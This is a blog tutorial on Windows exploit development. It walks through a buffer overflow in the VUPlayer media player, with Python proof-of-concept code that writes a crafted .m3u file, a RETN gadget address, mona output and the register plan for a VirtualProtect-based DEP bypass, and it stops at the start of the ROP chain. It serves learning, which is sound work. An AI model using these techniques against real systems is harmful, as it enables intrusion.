---
layout: single
title: Creating Win32 ROP Chains 
date: 2019-11-02
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Shellcode
  - Windows
  - Assembly
  - Return Oriented Programming 
  - ROP
  - Exploit Development
  - DEP Bypass
---

## Introduction
Continuing with the Windows exploit development our next stop is learning how to craft ROP chains. In the context of this blogpost we will be using them to disable DEP and execute shellcode on the stack; however, ROP chains are extremely versatile and in different contexts can be very powerful. Obviously stack based overflows aren't a very common bug class these days compared to 10 years ago, but this will allow us to use concepts we're familiar with (stack overflows) to learn concepts that are new to us (ROP chains). 

## ROP Chains
ROP stands for Return Oriented Programming. Essentially what we're doing is placing pointers to instructions on the stack, having execution follow those pointers to execute the instructions at that location and then execution returns to the stack to the next pointer. 

The reason this behavior is desirable is because when Data Execution Prevention (DEP) is enabled, we are typically unable to execute code in any section of memory that doesn't explicitly contain executable instructions. This means our traditional stack based overflow attacks won't work as we cannot execute shellcode on the stack. 

This is where the power of ROP comes into play. We uses tiny sections of existing code in the target program that are punctuated in sequence by a `RETN` instruction (called 'gadgets') and piece them together to make a function call which disables DEP. We can then run our shellcode on the stack as we're used to. 

## Required Reading
Corelan has essentially written a manifesto on DEP and Win32 ROP chains [here](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/). Nothing I say or do in this blog is new or groundbreaking, I'm simply recapitulating the ROP learning process for beginners like myself interested in taking their Windows game further and documenting my work for my own reference. 

FuzzySec also has a phenomenal post [here](https://www.fuzzysecurity.com/tutorials/expDev/7.html) as part of their Tutorials series, which also does a great job of walking through the reasoning and logic behind ROP chains.

You need to read and understand these blog posts very well in order to keep up. I will do my best to step through the process with the reader; however, it's always best to consult multiple sources and Corelan and Fuzzy are much more experienced and knowledgeable than I am. 

## Getting Started
In order to save time from scanning through Exploit DB for a suitable PoC and recreating the exploit, I found this [blog post by Steven Patterson](https://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html) and used the same vulnerable program. We will not be consulting the blog post for help on our ROP chain, simply using the same vulnerable program which you can download from [ExploitDB](https://www.exploit-db.com/exploits/40018). Afterwards, we can compare ROP chains and see if there were any areas we could've been more efficient. 

Our starting POC should look something like this: 
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

fuzz = "A" * 1012
fuzz += "B" * 4
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

This code will create a file `vuplayer-dep.m3u`. Launch the player in Immunity, you'll get some warnings referencing breakpoints, this is normal just click through them. Drag your newly created file into the program GUI and it should crash overwriting EIP with `42424242`. 

Great, we control EIP. Next we need to pass execution the code we're going to overwrite the stack with. For this, we will simply use a `RETN` instruction. We need one that is not ASLR enabled, so let's go ahead and get `mona.py` out and check the modules with a `!mona modules` command. There are several modules in the output which do not have ASLR enabled, namely: `BASSWMA.dll`, `BASSMIDI.dll`, and `BASS.dll`. 

In Immunity, we can right click in the disassembler pane, the top left, and hit `Search for` > `All Commands in all modules` > `RETN` > `Find`. Scroll until you locate a suitable `RETN` instruction in one of the three aformentioned modules. For this blogpost, I will be using the `RETN` located at `0x10101008`. (Go ahead and check it!)

So we input this address into our POC. 

```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

For all of our checking in this blogpost, the way I do it in Immunity is to open the MP3 player in the debugger, start it, go to the address of our `RETN` we know we'll be hitting every time, set a breakpoint. 

![](/assets/images/AWE/starting.JPG)

As you can see, we've hit our breakpoint and the stack looks perfect. EIP is at our `RETN` address and immediately after the pointer to our `RETN` function we see our `C` buffer where will we place additional pointers to ROP 'gadgets'.

## API Calls To Disable DEP
There are apparently a lot of different ways to disable DEP. FuzzySec has a nice chart on his blogpost so definitely check that out. We will use `mona.py` to determine what API call pointers we have access to that we can use to disable DEP with the command `!mona ropfunc`. This will output the results to `ropfunc.txt`. 

#### ropfunc.txt
```
0x00501a7c : msvcrt!strncpy | 0x75b808a9 | startnull,asciiprint,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x00501150 : kernel32!freelibrary | 0x7569f137 | startnull,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x005011f0 : kernel32!getprocaddress | 0x7569ce64 | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x10109268 : kernel32.getmodulehandlea | 0x7569dac3 |  {PAGE_EXECUTE_READWRITE} [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSWMA.dll)
0x1060e254 : kernel32.getmodulehandlea | 0x7569dac3 |  {PAGE_EXECUTE_READWRITE} [BASSMIDI.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSMIDI.dll)
0x1004027c : kernel32.getmodulehandlea | 0x7569dac3 | ascii {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASS.dll)
0x1010926c : kernel32.getprocaddress | 0x7569ce64 |  {PAGE_EXECUTE_READWRITE} [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSWMA.dll)
0x1060e258 : kernel32.getprocaddress | 0x7569ce64 |  {PAGE_EXECUTE_READWRITE} [BASSMIDI.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSMIDI.dll)
0x10040280 : kernel32.getprocaddress | 0x7569ce64 |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASS.dll)
0x005011dc : kernel32!getmodulehandlea | 0x7569dac3 | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x005011fc : kernel32!lstrcpyna | 0x756890f9 | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x00501020 : bass!bass_streamcreatefile | 0x100106e3 | startnull,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x00501200 : kernel32!createfilea | 0x7569ec31 | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x00501c18 : comdlg32!getopenfilenamea | 0x75c9a2a9 | startnull,asciiprint,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x005011d0 : kernel32!getlasterror | 0x7569cfb0 | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x005011d4 : kernel32!createmutexa | 0x7569d9a4 | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x00501abc : msvcrt!memmove | 0x75b79e5a | startnull {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x10109270 : kernel32.virtualprotect | 0x75692e1d |  {PAGE_EXECUTE_READWRITE} [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSWMA.dll)
0x1060e25c : kernel32.virtualprotect | 0x75692e1d |  {PAGE_EXECUTE_READWRITE} [BASSMIDI.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASSMIDI.dll)
0x10040284 : kernel32.virtualprotect | 0x75692e1d |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files\VUPlayer\BASS.dll)
0x00501214 : kernel32!lstrcpya | 0x7569a7df | startnull,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
0x00501154 : kernel32!loadlibrarya | 0x7569de35 | startnull,ascii {PAGE_READONLY} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files\VUPlayer\VUPlayer.exe)
```

Ordinarily, since they persist across the most versions of Windows, I'd like to either use `VirtualProtect` or `VirtualAlloc`. It looks like we only have pointers for `VirtualProtect` available to us, so that will be our weapon of choice. I used the pointer at `0x1060e25c`. 

Now that we have our function picked out, let's look at the values we need to call it and what it actually does. Consulting the [MSDN documentation](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?redirectedfrom=MSDN) and FuzzySec's blogpost we see the functiond definition and required paramters as follows: 
```cpp
Structure:                                 Parameters:

BOOL WINAPI VirtualProtect(          =>    A pointer to VirtualProtect()
  _In_   LPVOID lpAddress,           =>    Return Address (Redirect Execution to ESP)
  _In_   SIZE_T dwSize,              =>    dwSize up to you to chose as needed (0x201)
  _In_   DWORD flNewProtect,         =>    flNewProtect (0x40)
  _Out_  PDWORD lpflOldProtect       =>    A writable pointer
);
```

This is extremely helpful. Since we're working with a stack, we know we'll need to put these parameters on the stack in **reverse** order. Our plan of attack will roughly look like this:
+ Load registers strategically with parameters we need
+ call a `PUSHAD` to push all of the register values onto the stack at once

Considering all of these facts, our goals can be summarized as thus following from what FuzzySec writes about the goals of his `VirtualAlloc` call: 
```
GOALS
EAX 90909090 => Nop                                              
ECX <writeable pointer> => flProtect                                
EDX 00000040 => flNewProtect                                   
EBX 00000201 => dwSize                                           
ESP ???????? => Leave as is                                 
EBP ???????? => Call to ESP (jmp, call, push,..)              
ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
EDI 10101008 => ROP-Nop same as EIP
```

`VirtualProtect` has different parameters but overall, it is very similar to `VirtualAlloc` so we can adjust the goals outlined in FuzzySec's blogpost subtly. 

The value for the `dwSize` parameter was automatically chosen by a mona operation at some point it is more than enough space (513 bytes) for our calculator shellcode so I just left it. 

Let's go ahead and add these to our POC to keep us organized. 
```python
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop                                                
# ECX <writeable pointer> => flProtect                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```

Let's just knock all of these goals out in order starting with the EAX goal. 

## EAX ROP Chain


